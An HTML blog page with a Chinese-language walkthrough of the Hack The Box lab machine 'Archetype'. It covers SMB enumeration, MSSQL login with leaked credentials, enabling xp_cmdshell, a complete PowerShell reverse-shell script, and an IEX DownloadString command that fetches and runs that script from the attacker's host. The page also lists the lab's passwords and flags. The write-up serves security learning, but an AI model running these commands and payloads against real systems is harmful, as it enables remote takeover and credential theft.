@@ -1,0 +1,526 @@
+
+
+<!DOCTYPE html>
+<html lang="en" color-mode=light>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>HTB-Archetype WriteUp - Welcome To Wenbuer&#39;s Blog</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+  
+  <meta name="description" content="HTB-Archetype WriteUpnmap 扫...">
+  <meta name="author" content="Wenbuer">
+  <link rel="icon" href="/images/icons/favicon-16x16.png" type="image/png" sizes="16x16">
+  <link rel="icon" href="/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
+  <link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png" sizes="180x180">
+  <meta rel="mask-icon" href="/images/icons/stun-logo.svg" color="#333333">
+  
+    <meta rel="msapplication-TileImage" content="/images/icons/favicon-144x144.png">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1445822_s6x2xcokxrl.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+    
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">
+
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">
+
+      
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: false,
+      lazyload: {
+        enable: true,
+        only_post: 'false',
+        loading: '/images/theme/loading.gif'
+      },
+      donate: {
+        enable: true,
+        alipay: '/images/theme/alipay.jpg',
+        wechat: '/images/theme/wechatpay.jpg'
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        always_show: false
+      },
+      carrier: {
+        enable: true
+      },
+      daovoice: {
+        enable: false
+      },
+      preview: {
+        background: {
+          default: '/images/theme/background.jpg',
+          api: ''
+        },
+        motto: {
+          default: '我在开了灯的床头下，想问问自己的心啊。',
+          api: 'https://v2.jinrishici.com/one.json',
+          data_contents: '["data","content"]'
+        },
+      },
+      qrcode: {
+        enable: true,
+        type: 'url',
+        image: '/images/theme/qrcode.jpg',
+      },
+      toc: {
+        enable: true
+      },
+      scrollbar: {
+        model: 'normal'
+      },
+      notification: {
+        enable: false,
+        delay: 4500,
+        list: '',
+        page_white_list: '',
+        page_black_list: ''
+      }
+    }
+  </script>
+
+  
+
+  
+
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="Welcome To Wenbuer's Blog" type="application/atom+xml">
+</head>
+
+<body class="lock-screen">
+  <div class="loading"></div>
+  
+
+
+  <nav class="navbar">
+    <div class="left">
+      
+        <i class="iconfont iconqrcode j-navbar-qrcode"></i>
+      
+      
+        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
+      
+    </div>
+    <div class="center">HTB-Archetype WriteUp</div>
+    <div class="right">
+      <i class="iconfont iconmenu j-navbar-menu"></i>
+    </div>
+    
+      <div id="qrcode-navbar"></div>
+    
+  </nav>
+
+  
+
+<nav class="menu">
+  <div class="menu-wrap">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content"><li class="menu-item">
+        <a href="/ " class="underline "> 首页</a>
+      </li><li class="menu-item">
+        <a href="/galleries/ " class="underline "> 相册</a>
+      </li><li class="menu-item">
+        <a href="/archives/ " class="underline "> 归档</a>
+      </li><li class="menu-item">
+        <a href="/tags/ " class="underline "> 标签</a>
+      </li><li class="menu-item">
+        <a href="/categories/ " class="underline "> 分类</a>
+      </li><li class="menu-item">
+        <a href="/about/ " class="underline "> 关于</a>
+      </li></ul>
+    
+      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+    
+  </div>
+</nav>
+  <main id="main">
+  <div class="article-wrap">
+    <div class="row container">
+      <div class="col-xl-3"></div>
+      <div class="col-xl-6"><article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="/images/cover/wallhaven-11.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title">HTB-Archetype WriteUp</h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>April 13, 2021</span>
+      
+        <span class="post-info-item">
+          <i class="iconfont iconeye"></i><span id="/2021/04/13/HTB-Archetype%20WriteUp/" class="leancloud" data-flag-title="HTB-Archetype WriteUp"></span>
+        </span>
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>2463</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        <h3 id="HTB-Archetype-WriteUp"><a href="#HTB-Archetype-WriteUp" class="headerlink" title="HTB-Archetype WriteUp"></a>HTB-Archetype WriteUp</h3><h4 id="nmap-扫描"><a href="#nmap-扫描" class="headerlink" title="nmap 扫描"></a>nmap 扫描</h4><p><code>nmap -sV -sC 10.10.10.27</code></p>
+<p><img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/wenbuer/picgo@master//img/20210313210153.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  style="zoom:67%;" /></p>
+<p>根据上图扫描结果，靶机开放了135、139、445、1433端口</p>
+<ul>
+<li>135端口为RPC，可以进行口令爆破</li>
+<li><p>139端口为NetBIOS</p>
+</li>
+<li><p>445端口为SMB文件共享</p>
+</li>
+<li>1433端口与SQL服务有关</li>
+</ul>
+<h4 id="445端口SMB文件共享"><a href="#445端口SMB文件共享" class="headerlink" title="445端口SMB文件共享"></a>445端口SMB文件共享</h4><p>先查看SMB的共享文件</p>
+<p><code>smbclient -L 10.10.10.27</code></p>
+<p><img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/wenbuer/picgo@master//img/20210313204721.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  style="zoom:67%;" /></p>
+<p>smb要求输入密码，但是直接按回车之后，也可以看到共享列表</p>
+<p>在图中可以看到backups为共享的对象为全体，直接访问backups文件夹</p>
+<p><code>smbclient //10.10.10.27/backups</code></p>
+<p>回车</p>
+<p>然后用<code>ls</code>查看backups文件内容</p>
+<p>用<code>get</code>获取prod.dtsConfig文件</p>
+<p><img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/wenbuer/picgo@master//img/20210313205904.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  style="zoom: 67%;" /></p>
+<p>prod.dtsConfig文件就下载到了我们服务器中</p>
+<p><img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/wenbuer/picgo@master//img/20210313212722.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  style="zoom:67%;" /></p>
+<p>在prod.dtsConfig文件中，可以找sql的User ID和Password</p>
+<p>SQL Server的身份验证方式有两种：操作系统身份验证和数据库身份验证</p>
+<p>这里的参数值是操作系统身份验证方式，ARCHETYPE为主机名，sql_svc为登录数据库的操作系统用户名</p>
+<h4 id="mssqlclient登入数据库执行脚本"><a href="#mssqlclient登入数据库执行脚本" class="headerlink" title="mssqlclient登入数据库执行脚本"></a>mssqlclient登入数据库执行脚本</h4><p>这边需要下载impacket工具</p>
+<p><code>git clone https://github.com/SecureAuthCorp/impacket</code></p>
+<p><code>cd impacket</code></p>
+<p><code>python3 setup.py install</code></p>
+<p>然后利用mssqlclient和获取到的账号密码登入数据库</p>
+<p><code>mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth</code></p>
+<p><code>M3g4c0rp123</code></p>
+<p><img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/wenbuer/picgo@master//img/Lily_Screenshot_1615812452.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  style="zoom:67%;" /></p>
+<p>登入成功之后，我们需要测试一下该账号是否具有最高的sysadmin权限</p>
+<p><code>SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)</code></p>
+<p><img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/wenbuer/picgo@master//img/image-20210315205958962.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  style="zoom: 67%;" /></p>
+<p>结果显示，该账号确实具有sysadmin的权限，接下来启用xp_cmdshell获得RCE并反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mssql">EXEC sp_configure &#39;Show Advanced Options&#39;, 1; <br>reconfigure; <br>sp_configure;<br>EXEC sp_configure &#39;xp_cmdshell&#39;, 1;<br>reconfigure;<br>xp_cmdshell &quot;whoami&quot;<br></code></pre></td></tr></table></figure>
+<p>其中执行whoami的结果显示如下</p>
+<p><img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/wenbuer/picgo@master//img/image-20210315213821244.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  style="zoom:67%;" /></p>
+<p>说明该账户在SQL服务中具有archetype\sql_svc，但是在host上不具有任何权限</p>
+<p>创建一个shell.ps1脚本，内容如下</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$client</span> = <span class="hljs-built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="hljs-string">&quot;10.xx.xx.x&quot;</span>,xxx);<span class="hljs-variable">$stream</span> =<span class="hljs-variable">$client</span>.GetStream();[<span class="hljs-built_in">byte</span>[]]<span class="hljs-variable">$bytes</span> = <span class="hljs-number">0</span>..<span class="hljs-number">65535</span>|%&#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">while</span>((<span class="hljs-variable">$i</span> =<span class="hljs-variable">$stream</span>.Read(<span class="hljs-variable">$bytes</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$bytes</span>.Length)) <span class="hljs-operator">-ne</span> <span class="hljs-number">0</span>)&#123;;<span class="hljs-variable">$data</span> = (<span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="hljs-variable">$bytes</span>,<span class="hljs-number">0</span>, <span class="hljs-variable">$i</span>);<span class="hljs-variable">$sendback</span> = (<span class="hljs-built_in">iex</span> <span class="hljs-variable">$data</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> |<span class="hljs-built_in">Out-String</span> );<span class="hljs-variable">$sendback2</span> = <span class="hljs-variable">$sendback</span> + <span class="hljs-string">&quot;# &quot;</span>;<span class="hljs-variable">$sendbyte</span> =([<span class="hljs-type">text.encoding</span>]::ASCII).GetBytes(<span class="hljs-variable">$sendback2</span>);<span class="hljs-variable">$stream</span>.Write(<span class="hljs-variable">$sendbyte</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$sendbyte</span>.Length);<span class="hljs-variable">$stream</span>.Flush()&#125;;<span class="hljs-variable">$client</span>.Close()<br></code></pre></td></tr></table></figure>
+<p>查一下本地ip地址</p>
+<p><code>ifconfig tun0</code></p>
+<p><img   class="lazyload" data-original="https://i.loli.net/2021/03/16/TtYaHsXwW1JrncO.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  style="zoom:67%;" /></p>
+<p>得知本机在局域网内的ip为10.10.16.10</p>
+<p>修改shell.ps1脚本内ip内容为10.10.16.10，端口为443</p>
+<p>然后在shell.ps1脚本存在的文件夹下运行http服务，因为80端口有服务运行，选择在81端口上运行</p>
+<p><code>python3 -m http.server 81</code></p>
+<p><img    class="lazyload" data-original="https://i.loli.net/2021/03/16/tBRNGaxFJSqgo6L.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="    style="zoom:67%;" /><span class="image-caption">image-20210316112555605</span></p>
+<p>然后去另一个窗口运行nc，等待10.10.10.27的连接</p>
+<p><code>nc -nlvp 443</code></p>
+<p><img   class="lazyload" data-original="https://i.loli.net/2021/03/16/pab5TFDsLtrJOYe.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  style="zoom:67%;" /></p>
+<p>接下来进sql窗口执行下列命令</p>
+<p><code>xp_cmdshell &quot;Powershell &quot; IEX(New-Object Net.WebClient).DownloadString(\&quot;http://10.10.16.10:81/shell.ps1\&quot;);&quot;</code></p>
+<p>在http和nc窗口同时得到反馈</p>
+<p><img   class="lazyload" data-original="https://i.loli.net/2021/03/16/FitkpM9E5BbSDO1.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  style="zoom: 50%;" /></p>
+<p>在<code>\user\sql_svc\desktop</code>下获取user.txt</p>
+<p><img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/wenbuer/picgo/img/image-20210413214419239.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt=""></p>
+<p>得到user flag <code>3e7b102e78218e935bf3f4951fec21a3</code></p>
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>前面得到的只是普通用户的账号，接下来可以通过type指令查看Powershell的历史记录文件</p>
+<p><code>type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code></p>
+<p><img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/wenbuer/picgo/img/image-20210413215004497.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt=""></p>
+<p>这表示backups对管理员账号进行了映射，我们可以用psexec.py来取得管理员权限</p>
+<p>接下来用管理员账号<code>administrator</code>和密码<code>MEGACORP_4dm1n!!</code>进行登入</p>
+<p><img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/wenbuer/picgo/img/image-20210413215553355.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt=""></p>
+<p>进入到管理员桌面，取得root.txt</p>
+<p><img   class="lazyload" data-original="https://cdn.jsdelivr.net/gh/wenbuer/picgo/img/image-20210413215944832.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt=""></p>
+<p>提交flag<code>b91ccec3305e98240082d4474b848528</code>，完成Archetype机器</p>
+
+      </section>
+      <section class="extra">
+        
+          <ul class="copyright">
+  
+    <li><strong>本文作者：</strong>Wenbuer</li>
+    <li><strong>本文链接：</strong><a href="https://wenbuer.github.io/2021/04/13/HTB-Archetype%20WriteUp/index.html" title="https:&#x2F;&#x2F;wenbuer.github.io&#x2F;2021&#x2F;04&#x2F;13&#x2F;HTB-Archetype%20WriteUp&#x2F;index.html">https:&#x2F;&#x2F;wenbuer.github.io&#x2F;2021&#x2F;04&#x2F;13&#x2F;HTB-Archetype%20WriteUp&#x2F;index.html</a></li>
+    <li><strong>版权声明：</strong>本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" title="BY-NC-SA" target="_blank" rel="noopener">BY-NC-SA</a> 许可协议，转载请注明出处！</li>
+  
+</ul>
+        
+        
+          <section class="donate">
+  <div id="qrcode-donate">
+    <img   class="lazyload" data-original="/images/theme/alipay.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" >
+  </div>
+  <div class="icon">
+    <a href="javascript:;" id="alipay"><i class="iconfont iconalipay"></i></a>
+    <a href="javascript:;" id="wechat"><i class="iconfont iconwechat-fill"></i></a>
+  </div>
+</section>
+        
+        
+  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTB/" rel="tag">HTB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Penetration-testing/" rel="tag">Penetration testing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Study-life/" rel="tag">Study life</a></li></ul> 
+
+        
+  <nav class="nav">
+    <a></a>
+    <a href="/2021/03/14/NeSE%E4%B8%99%E9%98%9F3%E6%9C%88%E6%9C%88%E8%B5%9B%E8%AE%AD%E7%BB%83/">NeSE丙队3月月赛训练<i class="iconfont iconright"></i></a>
+  </nav>
+
+      </section>
+      
+        <section class="comments">
+  
+    <div class="btn" id="comments-btn">查看评论</div>
+  
+  
+<div id="valine"></div>
+<script defer src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+  window.onload = function () {
+    var loadValine = function () {
+      new Valine({
+        el: '#valine',
+        app_id: "Mqlwb0z4yiDoHxvfL9ofWy6H-gzGzoHsz",
+        app_key: "LkEbh1MQI8o3VWCt8ni657QF",
+        placeholder: "雁过留痕",
+        avatar: "mp",
+        pageSize: "10",
+        lang: "zh-CN",
+      });
+    }
+    if ( true ) {
+      $("#comments-btn").on("click", function () {
+        $(this).hide();
+        loadValine();
+      });
+    } else {
+      loadValine();
+    }
+  };
+</script>
+
+</section>
+      
+    </section>
+  </div>
+</article>
+</div>
+      <div class="col-xl-3">
+        
+          
+  <aside class="toc-wrap">
+    <h3 class="toc-title">文章目录：</h3>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTB-Archetype-WriteUp"><span class="toc-text">HTB-Archetype WriteUp</span></a></li></ol>
+  </aside>
+
+        
+      </div>
+    </div>
+  </div>
+</main>
+  
+
+<footer class="footer">
+  <div class="footer-social"><a 
+        href="tencent://message/?Menu=yes&uin=475923426 "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#12B7F5'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconQQ "></i>
+      </a><a 
+        href="javascript:; "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#09BB07'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconwechat-fill "></i>
+      </a><a 
+        href="https://github.com/wenbuer "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#9f7be1'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  icongithub-fill "></i>
+      </a><a 
+        href="mailto:wenbuer_zjc@163.com "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color=#FF3B00" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconmail"></i>
+      </a></div>
+  
+    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+  
+</footer>
+  
+      <div class="fab fab-plus">
+    <i class="iconfont iconplus"></i>
+  </div>
+  
+  
+  <div class="fab fab-up">
+    <i class="iconfont iconcaret-up"></i>
+  </div>
+  
+  
+  
+    
+<script src="/js/color-mode.js"></script>
+
+  
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+
+
+</body>
+
+<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+
+
+
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>
+
+
+
+
+<script src="/js/utils.js"></script>
+<script src="/js/script.js"></script>
+
+
+
+  <script>
+  $.getScript("//cdn.jsdelivr.net/npm/leancloud-storage@4.1.0/dist/av-min.js", () => {
+
+    AV.init({
+      appId: 'Mqlwb0z4yiDoHxvfL9ofWy6H-gzGzoHsz',
+      appKey: 'LkEbh1MQI8o3VWCt8ni657QF',
+      serverURLs: 'https://mqlwb0z4.lc-cn-n1-shared.com',
+    });
+
+    const showCount = (Counter) => {
+      const asyncLimit = new AsyncLimit(2);
+      $(".leancloud").each(async (e) => {
+        const url = $(".leancloud").eq(e).attr('id').trim();
+        const query = new AV.Query("Counter");
+        query.equalTo("words", url);
+        let count = await asyncLimit.run(() => query.count());
+        $(".leancloud").eq(e).text(count ? count : '--');
+      });
+    }
+
+    const addCount = (Counter) => {
+      const url = $(".leancloud").length === 1 ? $(".leancloud").attr('id').trim() : 'https://wenbuer.github.io';
+      var query = new Counter;
+      query.save({
+        words: url
+      });
+    }
+
+    $(function () {
+      const Counter = AV.Object.extend("Counter");
+      addCount(Counter);
+      showCount(Counter);
+    });
+
+  });
+</script>
+
+
+
+  <script>
+    (function () {
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      } else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+  <script>
+    window.ga = window.ga || function () {
+      (ga.q = ga.q || []).push(arguments)
+    };
+    ga.l = +new Date;
+    ga('create', '2260524932# id', 'auto');
+    ga('send', 'pageview');
+  </script>
+  <script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+</html>
